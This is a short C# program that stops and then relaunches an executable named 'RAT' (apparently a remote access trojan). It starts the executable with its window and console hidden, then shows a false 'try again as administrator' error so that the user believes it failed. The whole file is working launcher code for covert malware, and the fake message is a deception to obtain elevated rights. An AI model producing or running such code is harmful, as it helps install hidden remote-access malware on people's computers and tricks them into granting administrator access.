using System.Diagnostics;
using System.Runtime.InteropServices;

// Stop any existing process with the same name
void KillProcess(string name) {
    foreach (Process p in Process.GetProcessesByName(name)) {
        Console.WriteLine("Killing existing process {0}", p.Id);
        p.Kill();
    }
}

string execName;
if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {
    execName = "RAT.exe";
    Console.WriteLine("Running on Windows");
} else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux)) {
    execName = "RAT";
    Console.WriteLine("Running on Linux");
} else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX)) {
    execName = "RAT";
    Console.WriteLine("Running on OSX");
} else {
    Console.WriteLine("Unsupported OS");
    Console.Write("Press any key to exit.");
    Console.ReadKey(true);
    return 1;
}

try {
    KillProcess(execName);
}
catch (Exception e) {
    Console.WriteLine("Error killing process: {0}", e.Message);
}

ProcessStartInfo start =
    new() {
        FileName = execName,
        WindowStyle = ProcessWindowStyle.Hidden, // Hides GUI
        CreateNoWindow = true // Hides console
    };

try {
    Process.Start(start);
}
catch (Exception e) {
    Console.WriteLine("Error starting process: {0}", e.Message);
}

Console.WriteLine("An error occured. Try again as administrator.");
Console.Write("Press any key to exit.");
Console.ReadKey(true);
return 1;